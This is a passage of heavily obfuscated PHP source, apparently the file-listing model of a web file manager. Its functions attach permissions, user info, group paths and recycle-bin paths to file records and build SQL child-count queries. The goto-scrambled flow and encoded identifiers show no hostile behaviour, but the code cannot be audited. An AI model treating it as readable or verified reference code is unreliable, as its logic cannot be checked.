$e­¸•§‚® = $Cİİ†×ÙÆ[$c×‡¼æãõÅ]; goto bõ¿÷ˆôä†; bõ¿÷ˆôä†: $e­¸•§‚®[$bøÀ‹ŠÙÑá[77]] = $eæ¼¡íãÁ[$bøÀ‹ŠÙÑá[77]]; $e­¸•§‚®[$bøÀ‹ŠÙÑá[28]] = $eæ¼¡íãÁ[$bøÀ‹ŠÙÑá[28]]; self::$cacheFileInfo[$bøÀ‹ŠÙÑá[429] . $c×‡¼æãõÅ] = $e­¸•§‚®; goto aŠÂÊéÜ®Ç; aŠÂÊéÜ®Ç: unset($Cİİ†×ÙÆ[$c×‡¼æãõÅ][$bøÀ‹ŠÙÑá[75]]); $F¿ÎÏ’„ = is_array($f½Ûíù­Í÷[$c×‡¼æãõÅ]) ? $f½Ûíù­Í÷[$c×‡¼æãõÅ] : array(); $eæ¼¡íãÁ[$bøÀ‹ŠÙÑá[158]] = array_merge($F¿ÎÏ’„, $Cİİ†×ÙÆ[$c×‡¼æãõÅ]); goto eè„˜˜Ÿ¦; dÕÄâ¿Ã¸Û: } goto f³êË¶‡Â; D†„¢ì½Ğï: $cÊ·Î¾ˆÔí = $cÊ·Î¾ˆÔí ? $cÊ·Î¾ˆÔí : array(); $f½Ûíù­Í÷ = array(); foreach ($cÊ·Î¾ˆÔí as $BéŒÕÂ…’Ó) { if (!isset($f½Ûíù­Í÷[$BéŒÕÂ…’Ó[$bøÀ‹ŠÙÑá[423]]])) { $f½Ûíù­Í÷[$BéŒÕÂ…’Ó[$bøÀ‹ŠÙÑá[423]]] = array(); } $f½Ûíù­Í÷[$BéŒÕÂ…’Ó[$bøÀ‹ŠÙÑá[423]]][$BéŒÕÂ…’Ó[$bøÀ‹ŠÙÑá[89]]] = $BéŒÕÂ…’Ó[$bøÀ‹ŠÙÑá[364]]; } goto e™‘ËŠ˜Ã†; cÚŒ÷³„Â‘: $bøÀ‹ŠÙÑá =& $_SERVER[ºÖÙÂŒäÉê‡]; $CÒ·—‹ˆÖÆ = array_to_keyvalue($c’ßî—­¹, $bøÀ‹ŠÙÑá[33], $bøÀ‹ŠÙÑá[423]); $CÒ·—‹ˆÖÆ = array_filter(array_unique($CÒ·—‹ˆÖÆ)); goto fÑÔ–šÙ¢Ç; f³êË¶‡Â: } protected function _listAppendSourceInfo(&$A‹áª—§ô†, $aÍòÃ«Ù‹) { goto bÅ¹’†ƒ¶š; aõäÃ•ñö: $CâÈÙÎ Æ« = array_to_keyvalue_group($Dğô™…¾ìæ, $bÈÌÛ²÷›¢[374]); foreach ($A‹áª—§ô† as &$AÕÂÙ×íÀ) { $AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[396]] = array($bÈÌÛ²÷›¢[434] => 0, $bÈÌÛ²÷›¢[435] => 0, $bÈÌÛ²÷›¢[436] => 0); if (isset($F©Ÿ¶ÊÙØÀ[$AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[374]]])) { $AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[396]][$bÈÌÛ²÷›¢[437]] = 1; $AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[396]][$bÈÌÛ²÷›¢[438]] = $F©Ÿ¶ÊÙØÀ[$AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[374]]][$bÈÌÛ²÷›¢[28]]; } if (isset($a›¹‹ãŸ‰°[$AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[374]]])) { $AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[396]][$bÈÌÛ²÷›¢[439]] = array(); foreach ($a›¹‹ãŸ‰°[$AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[374]]] as $e½±àÛäòÎ) { $a“Ï¤àÑê = $CòØËÚç—[$e½±àÛäòÎ]; $AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[396]][$bÈÌÛ²÷›¢[439]][] = array($bÈÌÛ²÷›¢[440] => $a“Ï¤àÑê[$bÈÌÛ²÷›¢[372]], $bÈÌÛ²÷›¢[391] => $a“Ï¤àÑê[$bÈÌÛ²÷›¢[28]], $bÈÌÛ²÷›¢[441] => $a“Ï¤àÑê[$bÈÌÛ²÷›¢[442]]); } } if (isset($CâÈÙÎ Æ«[$AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[374]]])) { $AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[396]][$bÈÌÛ²÷›¢[443]] = array(); foreach ($CâÈÙÎ Æ«[$AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[374]]] as $EÑ¸»ˆÎåø) { $AÕÂÙ×íÀ[$bÈÌÛ²÷›¢[396]][$bÈÌÛ²÷›¢[443]] = array($bÈÌÛ²÷›¢[444] => $EÑ¸»ˆÎåø[$bÈÌÛ²÷›¢[445]], $bÈÌÛ²÷›¢[446] => $EÑ¸»ˆÎåø[$bÈÌÛ²÷›¢[447]], $bÈÌÛ²÷›¢[448] => $EÑ¸»ˆÎåø[$bÈÌÛ²÷›¢[374]], $bÈÌÛ²÷›¢[449] => $EÑ¸»ˆÎåø[$bÈÌÛ²÷›¢[450]], $bÈÌÛ²÷›¢[451] => $EÑ¸»ˆÎåø[$bÈÌÛ²÷›¢[452]]); } } } return $A‹áª—§ô†; goto Cß„Á›£ƒ ; b¹­¼áÔ³ã: $d™İØ˜Ò²Û = Model($bÈÌÛ²÷›¢[397])->listData(); $bç¼ì‚ßÏ’ = Model($bÈÌÛ²÷›¢[386])->listData(); $Dğô™…¾ìæ = Model($bÈÌÛ²÷›¢[433])->listSimple(); goto fæè‰èÁÓÉ; fæè‰èÁÓÉ: $CòØËÚç— = array_to_keyvalue($aİÃ­µÍ…Ö, $bÈÌÛ²÷›¢[372]); $a›¹‹ãŸ‰° = array_to_keyvalue_group($d™İØ˜Ò²Û, $bÈÌÛ²÷›¢[75], $bÈÌÛ²÷›¢[398]); $F©Ÿ¶ÊÙØÀ = array_to_keyvalue($bç¼ì‚ßÏ’, $bÈÌÛ²÷›¢[75]); goto aõäÃ•ñö; bÅ¹’†ƒ¶š: $bÈÌÛ²÷›¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!defined($bÈÌÛ²÷›¢[431])) { return; } $aİÃ­µÍ…Ö = Model($bÈÌÛ²÷›¢[432])->listData(); goto b¹­¼áÔ³ã; Cß„Á›£ƒ : } protected function _listAppendChildren(&$c„«ßÉ‚“µ, $e®ùéÒãÄ×) { goto E«’×Êê®; E«’×Êê®: $cçÓ©¤¬–† =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cöçœí¡â÷ = $cçÓ©¤¬–†[366]; $fÃ„ÇÍ§Ñ = array(); goto aÒÁŠö“óè; dÇÙø•ÙÀ¬: $dÇÊ²·ŒéÉ = $this->tablePrefix . $this->tableName; for ($E»ÛÍÃ›… = 0; $E»ÛÍÃ›… < $BÓ²ÒŒ½¨Ù; $E»ÛÍÃ›…++) { $B®ß¤Õø  = intval($c„«ßÉ‚“µ[$E»ÛÍÃ›…][$cçÓ©¤¬–†[401]]); if ($c„«ßÉ‚“µ[$E»ÛÍÃ›…][$cçÓ©¤¬–†[375]]) { $CŠ¥àá‘Ã = $c„«ßÉ‚“µ[$E»ÛÍÃ›…][$cçÓ©¤¬–†[374]]; $Cöçœí¡â÷ .= "\123\105\114\x45\103\124\40\x2a\x20\x46\122\117\x4d\40\50\x53\105\x4c\105\x43\124\40\47{$CŠ¥àá‘Ã}\x5f\150\141\x73\x46\151\154\145\x27\x20\141\163\40\x68\141\x73\x2c\143\157\x75\156\164\50\61\x29\40\x61\x73\x20\x68\x61\163\103\x6f\x75\x6e\x74\40\x46\x52\x4f\x4d\40\140{$dÇÊ²·ŒéÉ}\140\40\12\x9\x9\11\x9\11\167\150\x65\162\x65\40\160\141\162\x65\156\x74\x49\x44\75{$CŠ¥àá‘Ã}\x20\141\156\x64\40\x69\163\x46\157\154\144\x65\x72\x3d\x30\40\x61\x6e\144\x20\x69\163\104\145\x6c\x65\x74\145\x3d{$B®ß¤Õø }\51\40\x61\x73\x20\164\142\61\137{$CŠ¥àá‘Ã}\x20\x75\x6e\x69\x6f\156\x20\x61\154\x6c\x20\xa\11\11\x9\x9\11\123\x45\x4c\x45\103\124\x20\52\40\x46\x52\x4f\x4d\40\50\123\105\x4c\105\103\124\40\x27{$CŠ¥àá‘Ã}\137\150\141\163\106\157\154\x64\x65\x72\x27\40\x61\x73\x20\x68\x61\163\106\151\x6c\x65\54\x63\x6f\x75\156\x74\x28\x31\51\40\x61\x73\x20\x68\x61\x73\103\x6f\165\x6e\x74\40\x46\122\x4f\x4d\40\140{$dÇÊ²·ŒéÉ}\140\x20\xa\11\x9\x9\x9\x9\x77\150\x65\162\145\40\x70\141\162\145\156\x74\111\104\x3d{$CŠ¥àá‘Ã}\40\x61\x6e\x64\40\x69\163\106\x6f\x6c\x64\145\x72\x3d\x31\x20\x61\156\144\x20\x69\163\x44\145\154\145\x74\145\x3d{$B®ß¤Õø }\x29\x20\x61\x73\40\164\x62\62\137{$CŠ¥àá‘Ã}\40\165\x6e\151\x6f\156\x20\x61\x6c\154\40"; } if ((strlen($Cöçœí¡â÷) >= $Fù¸šÍÖÇÀ || $E»ÛÍÃ›… == $BÓ²ÒŒ½¨Ù - 1) && $Cöçœí¡â÷) { $Cöçœí¡â÷ = substr($Cöçœí¡â÷, 0, -strlen($cçÓ©¤¬–†[453])); $CœÚ˜­Û­ = $this->query($Cöçœí¡â÷); $fÃ„ÇÍ§Ñ = array_merge($fÃ„ÇÍ§Ñ, $CœÚ˜­Û­); $Cöçœí¡â÷ = $cçÓ©¤¬–†[33]; } } $fÃ„ÇÍ§Ñ = array_to_keyvalue($fÃ„ÇÍ§Ñ, $cçÓ©¤¬–†[454]); goto e‚‹ê…ÚÄ; e‚‹ê…ÚÄ: foreach ($c„«ßÉ‚“µ as &$D¹ëÊ‡ä) { if ($D¹ëÊ‡ä[$cçÓ©¤¬–†[375]]) { unset($D¹ëÊ‡ä[$cçÓ©¤¬–†[377]]); $D¹ëÊ‡ä[$cçÓ©¤¬–†[198]] = intval($fÃ„ÇÍ§Ñ[$D¹ëÊ‡ä[$cçÓ©¤¬–†[374]] . $cçÓ©¤¬–†[455]][$cçÓ©¤¬–†[456]]); $D¹ëÊ‡ä[$cçÓ©¤¬–†[197]] = intval($fÃ„ÇÍ§Ñ[$D¹ëÊ‡ä[$cçÓ©¤¬–†[374]] . $cçÓ©¤¬–†[457]][$cçÓ©¤¬–†[456]]); } } goto A¼¢²Õ¼öš; aÒÁŠö“óè: $Fù¸šÍÖÇÀ = 1024 * 50; $c„«ßÉ‚“µ = is_array($c„«ßÉ‚“µ) ? $c„«ßÉ‚“µ : array(); $BÓ²ÒŒ½¨Ù = count($c„«ßÉ‚“µ); goto dÇÙø•ÙÀ¬; A¼¢²Õ¼öš: } protected function _listAppendAuth(&$EãíŒ¥Ã™Ü) { goto a±•ÂĞõæº; a±•ÂĞõæº: $aØÆÍ¥ŒĞŸ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!defined($aØÆÍ¥ŒĞŸ[431])) { return; } $F“‚µ—¢ÊÅ = array(); goto fÀÜìß£™Ã; d¶“Ú˜‘¬ö: $BÔêŒÎ“áÄ = Model($aØÆÍ¥ŒĞŸ[458])->getSourceList($F“‚µ—¢ÊÅ, $DÙ–›ã´¼); foreach ($EãíŒ¥Ã™Ü as $e¬ä»ãÔ’ => &$dó¥Ğ‚›àù) { $dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[381]] = $BÔêŒÎ“áÄ[$dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[374]]]; if (!$dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[381]] && $dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[376]] == self::TYPE_GROUP) { $dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[381]] = Action($aØÆÍ¥ŒĞŸ[459])->pathGroupAuthMake($dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[460]]); if (!$dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[381]] && !_get($GLOBALS, $aØÆÍ¥ŒĞŸ[461])) { $dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[195]] = !1; $dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[194]] = !1; } } if ($dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[381]]) { $dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[195]] = AuthModel::authCheckEdit($dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[381]][$aØÆÍ¥ŒĞŸ[382]]); $dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[194]] = AuthModel::authCheckView($dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[381]][$aØÆÍ¥ŒĞŸ[382]]); } $this->groupPathDisplay($dó¥Ğ‚›àù); } goto cŸØ‡‹ô; fÀÜìß£™Ã: foreach ($EãíŒ¥Ã™Ü as $dó¥Ğ‚›àù) { if ($dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[376]] == self::TYPE_GROUP) { $F“‚µ—¢ÊÅ[] = $dó¥Ğ‚›àù[$aØÆÍ¥ŒĞŸ[374]]; } } if (!$F“‚µ—¢ÊÅ) { return; } $DÙ–›ã´¼ = array_to_keyvalue($EãíŒ¥Ã™Ü, $aØÆÍ¥ŒĞŸ[374]); goto d¶“Ú˜‘¬ö; cŸØ‡‹ô: } public function groupPathDisplay(&$BÇ…î÷ßù¹) { goto A×Ù÷î–ìƒ; bÜñ»¯Ø……: $BÇ…î÷ßù¹[$b‡ñÜ¶‰Âˆ[468]] = $FŞŠ¬ÃŠÉ . $e§Ë„À‰Ñ[$b‡ñÜ¶‰Âˆ[396]][$b‡ñÜ¶‰Âˆ[374]]; goto eÈàÏéŞ§; A×Ù÷î–ìƒ: $b‡ñÜ¶‰Âˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($BÇ…î÷ßù¹[$b‡ñÜ¶‰Âˆ[376]] != self::TYPE_GROUP) { return; } $e§Ë„À‰Ñ = Model($b‡ñÜ¶‰Âˆ[462])->getInfo($BÇ…î÷ßù¹[$b‡ñÜ¶‰Âˆ[460]]); goto f­·Ûí–øÆ; f­·Ûí–øÆ: $Cä”ÏğôÀì = $this->parentLevelArray($e§Ë„À‰Ñ[$b‡ñÜ¶‰Âˆ[463]]); $FŞŠ¬ÃŠÉ = $b‡ñÜ¶‰Âˆ[33]; foreach ($Cä”ÏğôÀì as $dç‰­ñë¥©) { $a”ì–×¢¨Ş = Model($b‡ñÜ¶‰Âˆ[462])->getInfo($dç‰­ñë¥©); $FŞŠ¬ÃŠÉ .= $a”ì–×¢¨Ş[$b‡ñÜ¶‰Âˆ[396]][$b‡ñÜ¶‰Âˆ[374]] . $b‡ñÜ¶‰Âˆ[47]; } goto Dğ‡ò‘œŒŠ; Dğ‡ò‘œŒŠ: $BÇ…î÷ßù¹[$b‡ñÜ¶‰Âˆ[464]] = $e§Ë„À‰Ñ[$b‡ñÜ¶‰Âˆ[465]]; $BÇ…î÷ßù¹[$b‡ñÜ¶‰Âˆ[385]] = $e§Ë„À‰Ñ[$b‡ñÜ¶‰Âˆ[463]]; $BÇ…î÷ßù¹[$b‡ñÜ¶‰Âˆ[466]] = $e§Ë„À‰Ñ[$b‡ñÜ¶‰Âˆ[467]]; goto bÜñ»¯Ø……; eÈàÏéŞ§: } protected function _listAppendPath(&$B‚‰…¨ô¥) { goto b›ˆ¸õİ´ƒ; C½ùÊ¹–§®: $Eëñ‘èÍ…ñ = array(); foreach ($b¤çôÆö£Ê as $D’¸Ï•¤ĞË => $fÀìÛ£øÌÑ) { if (!$fÀìÛ£øÌÑ) { $Eëñ‘èÍ…ñ[] = $D’¸Ï•¤ĞË; } } if ($Eëñ‘èÍ…ñ) { $F¬«•Ñ…‡Ã = array($eø±ìëÂÁ[388] => array($eø±ìëÂÁ[389], $Eëñ‘èÍ…ñ)); if (count($Eëñ‘èÍ…ñ) == 1) { $Dğ¥âÌô« = $this->sourceInfo($Eëñ‘èÍ…ñ[0]); $Dğ¥âÌô« = is_array($Dğ¥âÌô«) ? array($Dğ¥âÌô«) : !1; } else { $Dğ¥âÌô« = $this->field($eø±ìëÂÁ[469])->where($F¬«•Ñ…‡Ã)->select(); } $E ™•’„ = array_to_keyvalue($Dğ¥âÌô«, $eø±ìëÂÁ[374], $eø±ìëÂÁ[28]); $b¤çôÆö£Ê = array_merge_index($b¤çôÆö£Ê, $E ™•’„); } goto f ŠÛÃ¦Ü¢; b›ˆ¸õİ´ƒ: $eø±ìëÂÁ =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¤çôÆö£Ê = array(); foreach ($B‚‰…¨ô¥ as &$Fë×ñÆÈ) { $b¤çôÆö£Ê[$Fë×ñÆÈ[$eø±ìëÂÁ[374]]] = $Fë×ñÆÈ[$eø±ìëÂÁ[28]]; $a¢•©ÜŞÛ = $this->parentLevelArray($Fë×ñÆÈ[$eø±ìëÂÁ[463]]); array_shift($a¢•©ÜŞÛ); foreach ($a¢•©ÜŞÛ as $BàæŠÂ¾”ù) { if (!isset($b¤çôÆö£Ê[$BàæŠÂ¾”ù])) { $b¤çôÆö£Ê[$BàæŠÂ¾”ù] = 0; } } } goto C½ùÊ¹–§®; f ŠÛÃ¦Ü¢: $fÉ¶Ó†–³à = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($B‚‰…¨ô¥ as &$Fë×ñÆÈ) { goto aß»²‚Ô´‹; aß»²‚Ô´‹: $a¢•©ÜŞÛ = $this->parentLevelArray($Fë×ñÆÈ[$eø±ìëÂÁ[463]]); $E´ÍÚŞÉ = $this->_listAppendPathRoot($Fë×ñÆÈ, $a¢•©ÜŞÛ); foreach ($a¢•©ÜŞÛ as $BàæŠÂ¾”ù) { if (isset($b¤çôÆö£Ê[$BàæŠÂ¾”ù])) { $E´ÍÚŞÉ .= $b¤çôÆö£Ê[$BàæŠÂ¾”ù] . $eø±ìëÂÁ[8]; } } goto E‡¡ˆ®†…›; E‡¡ˆ®†…›: if ($a¢•©ÜŞÛ) { $E´ÍÚŞÉ .= $Fë×ñÆÈ[$eø±ìëÂÁ[28]]; } if ($Fë×ñÆÈ[$eø±ìëÂÁ[375]]) { $E´ÍÚŞÉ .= $eø±ìëÂÁ[8]; } $Fë×ñÆÈ[$eø±ìëÂÁ[470]] = str_replace($eø±ìëÂÁ[471], $eø±ìëÂÁ[8], $E´ÍÚŞÉ); goto D±¹ÀÇ…­«; D±¹ÀÇ…­«: $C­¬„ËŸ»Ü = trim($Fë×ñÆÈ[$eø±ìëÂÁ[470]], $eø±ìëÂÁ[8]); if ($Fë×ñÆÈ[$eø±ìëÂÁ[465]] == $eø±ìëÂÁ[472] && $C­¬„ËŸ»Ü) { $Fë×ñÆÈ[$eø±ìëÂÁ[28]] = $C­¬„ËŸ»Ü; } $this->_listAppendPathRecycle($Fë×ñÆÈ, $a¢•©ÜŞÛ, $fÉ¶Ó†–³à); goto eº™îºö¤‹; eº™îºö¤‹: } goto bÛôãíÅƒ¥; bÛôãíÅƒ¥: } private function _listAppendPathRecycle(&$bÖèáğÚ²š, $e»†àò‹¯, $eä¢¥Á™³¼) { goto cË£‡Ô‰ã; f—ëíµ‰: $B¨ºíÄÈ‰Ë = explode($b—®óƒœŸ®[8], trim($bÖèáğÚ²š[$b—®óƒœŸ®[470]], $b—®óƒœŸ®[8])); $E‚Šâ‰¯ˆ = implode($b—®óƒœŸ®[8], array_slice($B¨ºíÄÈ‰Ë, 2)); $bÖèáğÚ²š[$b—®óƒœŸ®[470]] = $b—®óƒœŸ®[8] . LNG($b—®óƒœŸ®[473]) . $b—®óƒœŸ®[8] . ltrim($E‚Šâ‰¯ˆ, $b—®óƒœŸ®[8]); goto cÉ£÷ÜœÃÂ; cÉ£÷ÜœÃÂ: $bÖèáğÚ²š[$b—®óƒœŸ®[463]] = $b—®óƒœŸ®[474] . implode($b—®óƒœŸ®[47], array_slice($e»†àò‹¯, 1)) . $b—®óƒœŸ®[47]; if ($bÖèáğÚ²š[$b—®óƒœŸ®[374]] == $eä¢¥Á™³¼) { $bÖèáğÚ²š[$b—®óƒœŸ®[463]] = $b—®óƒœŸ®[474]; $bÖèáğÚ²š[$b—®óƒœŸ®[465]] = $b—®óƒœŸ®[472]; $bÖèáğÚ²š[$b—®óƒœŸ®[28]] = LNG($b—®óƒœŸ®[473]); } $bÖèáğÚ²š[$b—®óƒœŸ®[475]] = $b—®óƒœŸ®[476]; goto EßÁ›ó«ÇÏ; cË£‡Ô‰ã: $b—®óƒœŸ® =& $_SERVER[ºÖÙÂŒäÉê‡]; if (intval($bÖèáğÚ²š[$b—®óƒœŸ®[376]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($eä¢¥Á™³¼, $e»†àò‹¯) && $bÖèáğÚ²š[$b—®óƒœŸ®[374]] != $eä¢¥Á™³¼) { return; } goto f—ëíµ‰; EßÁ›ó«ÇÏ: } protected function _listAppendPathRoot(&$D˜šæóåÂŞ, $c°²Ï‚©’) { $C™¹Û¶ÜÈ¡ =& $_SERVER[ºÖÙÂŒäÉê‡]; $bİâÀ…ò½º = $C™¹Û¶ÜÈ¡[33]; if ($D˜šæóåÂŞ[$C™¹Û¶ÜÈ¡[376]] == self::TYPE_USER) { if (defined($C™¹Û¶ÜÈ¡[431]) && $D˜šæóåÂŞ[$C™¹Û¶ÜÈ¡[460]] == USER_ID) { $bİâÀ…ò½º = LNG($C™¹Û¶ÜÈ¡[477]); if (!$c°²Ï‚©’) { $D˜šæóåÂŞ[$C™¹Û¶ÜÈ¡[28]] = $bİâÀ…ò½º; } } else { $b‚ßòª®ë¥ = Model($C™¹Û¶ÜÈ¡[478])->getInfoSimple($D˜šæóåÂŞ[$C™¹Û¶ÜÈ¡[460]]); $bİâÀ…ò½º = LNG($C™¹Û¶ÜÈ¡[479]) . $C™¹Û¶ÜÈ¡[153] . $b‚ßòª®ë¥[$C™¹Û¶ÜÈ¡[28]] . $C™¹Û¶ÜÈ¡[480]; } } else { if ($D˜šæóåÂŞ[$C™¹Û¶ÜÈ¡[376]] == self::TYPE_GROUP) { $b‚ßòª®ë¥ = Model($C™¹Û¶ÜÈ¡[462])->getInfoSimple($D˜šæóåÂŞ[$C™¹Û¶ÜÈ¡[460]]); $bİâÀ…ò½º = $b‚ßòª®ë¥[$C™¹Û¶ÜÈ¡[28]]; } else { if ($D˜šæóåÂŞ[$C™¹Û¶ÜÈ¡[376]] == self::TYPE_SYSTEM) { $b‚ßòª®ë¥ = $this->sourceInfo($c°²Ï‚©’[0], !0); $bİâÀ…ò½º = $b‚ßòª®ë¥[$C™¹Û¶ÜÈ¡[28]]; } } } $bİâÀ…ò½º = $bİâÀ…ò½º ? $C™¹Û¶ÜÈ¡[8] . $bİâÀ…ò½º . $C™¹Û¶ÜÈ¡[8] : $C™¹Û¶ÜÈ¡[8]; return $bİâÀ…ò½º; } protected function _listAppendUser(&$A¤˜¿ÂŠ¥„) { $BÏˆ¹øõŸ£ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E¯Ö„¯–’ = array_to_keyvalue($A¤˜¿ÂŠ¥„, $BÏˆ¹øõŸ£[33], $BÏˆ¹øõŸ£[383]); $B×ƒ‚”›¥œ = array_to_keyvalue($A¤˜¿ÂŠ¥„, $BÏˆ¹øõŸ£[33], $BÏˆ¹øõŸ£[384]); $CùÃ”¾Â¼Í = array_merge($E¯Ö„¯–’, $B×ƒ‚”›¥œ); $cíë™ÕÂê¢ = Model($BÏˆ¹øõŸ£[481])->userListInfo($CùÃ”¾Â¼Í); foreach ($A¤˜¿ÂŠ¥„ as &$eèÅ„‡‘šÄ) { $D¯”Æùñ’Š = $eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[383]]; $eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[383]] = $cíë™ÕÂê¢[$D¯”Æùñ’Š] ? $cíë™ÕÂê¢[$D¯”Æùñ’Š] : !1; $D¯”Æùñ’Š = $eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[384]]; $eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[384]] = $cíë™ÕÂê¢[$D¯”Æùñ’Š] ? $cíë™ÕÂê¢[$D¯”Æùñ’Š] : !1; if (isset($eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[421]]) && $eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[421]][$BÏˆ¹øõŸ£[482]]) { $BÂÌ××„íó = $GLOBALS[$BÏˆ¹øõŸ£[6]][$BÏˆ¹øõŸ£[84]][$BÏˆ¹øõŸ£[483]]; if ($eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[421]][$BÏˆ¹øõŸ£[484]] <= time() - $BÂÌ××„íó) { $this->metaSet($eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[374]], $BÏˆ¹øõŸ£[482], null); $this->metaSet($eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[374]], $BÏˆ¹øõŸ£[484], null); unset($eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[421]][$BÏˆ¹øõŸ£[482]]); continue; } $AƒºÌñĞ²ä = $eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[421]][$BÏˆ¹øõŸ£[482]]; $eèÅ„‡‘šÄ[$BÏˆ¹øõŸ£[421]][$BÏˆ¹øõŸ£[485]] = Model($BÏˆ¹øõŸ£[481])->getInfoSimpleOuter($AƒºÌñĞ²ä); } } } public function parentLevelArray($aÄ÷†øù‘) { $cî„˜×¥› =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÄ÷†øù‘ = explode($cî„˜×¥›[47], trim($aÄ÷†øù‘, $cî„˜×¥›[47])); return array_remove_value($aÄ÷†øù‘, $cî„˜×¥›[472]); } public function listAll($a¹Š¶´öï„) { goto eŞØª¼Œğ; e†ó¨ãœ: $cùÂ¥Ô†ÏÄ = $EÍöß Ö²[490]; $FÆ½×îîÂÉ = "\x4c\105\106\124\40\x4a\117\x49\116\40{$this->tablePrefix}\x69\157\137\x66\151\154\x65\40\x66\x69\154\145\40\x6f\156\x20\163\157\x75\x72\x63\145\x2e\x66\x69\x6c\145\x49\104\x20\75\40\146\x69\154\145\56\x66\x69\x6c\145\x49\x44"; $a£ˆš¡È«² = $this->alias($EÍöß Ö²[491])->field($cùÂ¥Ô†ÏÄ)->where($eÛ©¸×•Ò)->join($FÆ½×îîÂÉ)->select(); goto d­ÃËŠÙà›; eŞØª¼Œğ: $EÍöß Ö² =& $_SERVER[ºÖÙÂŒäÉê‡]; $E¦ÅË£†Ãœ = $this->sourceInfo($a¹Š¶´öï„); $eÛ©¸×•Ò = array($EÍöß Ö²[486] => array($EÍöß Ö²[487], $E¦ÅË£†Ãœ[$EÍöß Ö²[463]] . $a¹Š¶´öï„ . $EÍöß Ö²[488]), $EÍöß Ö²[489] => 0); goto e†ó¨ãœ; AàÖ°´±µÔ: $a£ˆš¡È«² = array_to_keyvalue($a£ˆš¡È«², $EÍöß Ö²[374]); $FƒÇƒæ¼ñ = "\57{$E¦ÅË£†Ãœ[$EÍöß Ö²[28]]}\x2f"; $FƒÇƒæ¼ñ = $FƒÇƒæ¼ñ == $EÍöß Ö²[471] ? $EÍöß Ö²[8] : $FƒÇƒæ¼ñ; goto dš¿õÂ; dš¿õÂ: $bª•§®êŞ¥ = array(); foreach ($a£ˆš¡È«² as $a½ÍÁõÇ => $bàø¤˜–À) { goto aáâ‚İ÷Ö¾; aÙÔ¥ôøê: for ($AƒàÑéƒİ‡ = 0; $AƒàÑéƒİ‡ < count($aì¯³š¶); $AƒàÑéƒİ‡++) { $cˆÀÍ×ğ†æ .= $a£ˆš¡È«²[$aì¯³š¶[$AƒàÑéƒİ‡]][$EÍöß Ö²[28]] . $EÍöß Ö²[8]; } $cˆÀÍ×ğ†æ .= $bàø¤˜–À[$EÍöß Ö²[28]]; if ($bàø¤˜–À[$EÍöß Ö²[375]]) { $cˆÀÍ×ğ†æ .= $EÍöß Ö²[8]; } goto B‰Õë†¢´Ü; B‰Õë†¢´Ü: $cˆÀÍ×ğ†æ = str_replace($EÍöß Ö²[471], $EÍöß Ö²[8], $cˆÀÍ×ğ†æ); $cˆÀÍ×ğ†æ = str_replace($EÍöß Ö²[471], $EÍöß Ö²[8], $cˆÀÍ×ğ†æ); $A¡¹ÄÜéçÄ = array($EÍöß Ö²[392] => str_replace($EÍöß Ö²[471], $EÍöß Ö²[8], $cˆÀÍ×ğ†æ), $EÍöß Ö²[492] => intval($bàø¤˜–À[$EÍöß Ö²[375]]), $EÍöß Ö²[396] => $this->pathInfoFilter($bàø¤˜–À, !0)); goto e‡â‡’ªÃ×; aáâ‚İ÷Ö¾: $aì¯³š¶ = $this->parentLevelArray($bàø¤˜–À[$EÍöß Ö²[463]]); array_shift($aì¯³š¶); $cˆÀÍ×ğ†æ = $FƒÇƒæ¼ñ; goto aÙÔ¥ôøê; e‡â‡’ªÃ×: if (!$bàø¤˜–À[$EÍöß Ö²[375]]) { $A¡¹ÄÜéçÄ[$EÍöß Ö²[423]] = $bàø¤˜–À[$EÍöß Ö²[423]]; $A¡¹ÄÜéçÄ[$EÍöß Ö²[493]] = $bàø¤˜–À[$EÍöß Ö²[75]]; } $bª•§®êŞ¥[] = $A¡¹ÄÜéçÄ; goto D¦ëÈô…©; D¦ëÈô…©: } return $bª•§®êŞ¥; goto fùÜ‹³¨«ò; d­ÃËŠÙà›: $this->_listAppendAuth($a£ˆš¡È«²); $this->_listAppendUser($a£ˆš¡È«²); $this->_listAppendPath($a£ˆš¡È«²); goto AàÖ°´±µÔ; fùÜ‹³¨«ò: } } class 